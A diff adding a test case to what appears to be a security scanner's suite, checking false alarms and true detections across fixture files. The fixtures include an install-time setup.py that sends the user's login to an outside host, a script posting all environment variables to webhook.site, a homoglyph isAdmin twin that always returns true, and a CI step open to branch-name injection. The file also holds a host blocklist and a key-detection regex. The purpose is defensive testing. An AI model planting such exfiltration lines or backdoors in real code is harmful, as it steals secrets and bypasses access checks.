@@ -1181,6 +1181,36 @@ test("fourth-corpus false alarms: env blocks, architecture in a download address
   assert.deepEqual(at("secret-assignment", "db/checksums.json"), []);
 });
 
+test("fifth-corpus false alarms: base branches, blocklists, look-alike letters, key patterns, own actions", async () => {
+  const dir = project({
+    ".git/config": '[remote "origin"]\n\turl = https://github.com/Acme-Org/app.git\n',
+    ".github/workflows/ci.yml": "name: ci\non: pull_request_target\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: python helper.py ${{ github.event.pull_request.base.ref }}\n      - run: echo ${{ github.event.pull_request.head.ref }}\n      - uses: acme-org/gh-actions/login@main\n      - uses: someone-else/deploy@main\n",
+    "app/flow/api/setup.py": "import requests\ndef check(base_url, headers):\n    requests.get(f\"{base_url}/models\", headers=headers, timeout=10).raise_for_status()\n",
+    "pkg/setup.py": j("from setuptools import setup\nimport urllib.request\nurllib.request.urlopen('https://collect.example.net/' + __import__('os').getlo", "gin())\nsetup(name='x')\n"),
+    "app/Blocklist.php": "<?php\nreturn [\n    'mailinator.com',\n    'webhook.site',\n    'requestcatcher.com',\n];\n",
+    "app/send.js": j("fetch('https://webhook", ".site/6eb45ce5-b611-4be1-8b96-c2965755662b', { method: 'POST', body: JSON.stringify(process.env) });\n"),
+    "web/Choices.ts": "export const get\u0421hoiceSelector = () => '.choice';\nexport const pick = () => get\u0421hoiceSelector();\n",
+    "web/auth.ts": "export function isAdmin(u) { return u.role === 'admin'; }\nexport function is\u0410dmin(u) { return true; }\n",
+    "src/scrubber.js": "const RULES = [\n  { name: 'rsa', regex: /-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----/g },\n];\n",
+    "src/keys.rs": "const TEST_FAKE_RSA_KEY_0: &str = \"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC\n-----END PRIVATE KEY-----\";\n",
+    "src/api.js": "export const API = { accessTokenList: \"GET:/api/token\", accessTokenRevoke: \"POST:/api/token/blacklist\" };\n",
+    "deploy.sh": "PG_PASSWORD=\"$(generate_password)\"\n",
+  });
+  const r = await run(dir);
+  const at = (rule, file) => r.findings.filter(f => f.rule === rule && f.file === file).map(f => `${f.line} ${f.severity}`);
+  assert.deepEqual(at("gha-script-injection", ".github/workflows/ci.yml"), ["8 high"], "the base branch belongs to the repository; the head branch is the author's");
+  assert.deepEqual(r.findings.filter(f => f.rule === "gha-unpinned-action").map(f => f.evidence.trim()), ["- uses: someone-else/deploy@main"], "the organisation's own actions are its own code");
+  assert.deepEqual(at("setup-py-runs-code", "app/flow/api/setup.py"), [], "a module that happens to be called setup.py");
+  assert.deepEqual(at("setup-py-runs-code", "pkg/setup.py"), ["2 high"]);
+  assert.deepEqual(at("mal-oast-endpoint", "app/Blocklist.php"), [], "a blocklist names these hosts");
+  assert.deepEqual(at("mal-oast-endpoint", "app/send.js"), ["1 high"]);
+  assert.deepEqual(at("anom-homoglyph-identifier", "web/Choices.ts"), ["1 medium"], "one name, spelt the same way everywhere: a typo");
+  assert.deepEqual(at("anom-homoglyph-identifier", "web/auth.ts"), ["2 high"], "a twin of a real name");
+  assert.deepEqual(at("secret-private-key", "src/scrubber.js"), [], "a pattern that looks for keys");
+  assert.deepEqual(at("secret-private-key", "src/keys.rs"), ["1 low"], "a key that says it is fake");
+  assert.deepEqual(at("secret-assignment", "src/api.js").concat(at("secret-assignment", "deploy.sh")), []);
+});
+
 test("guard: Rust crates and Go modules", async () => {
   const p = c => parseInstalls(c, { exists: () => false }).map(x => x.index ? `index ${x.index}` : x.remote ? `remote ${x.remote}` : `${x.eco}:${x.name}${x.want ? "@" + x.want : ""}`);
   assert.deepEqual(p("cargo add serde tokio@1.38 --features full"), ["cargo:serde", "cargo:tokio@1.38"]);
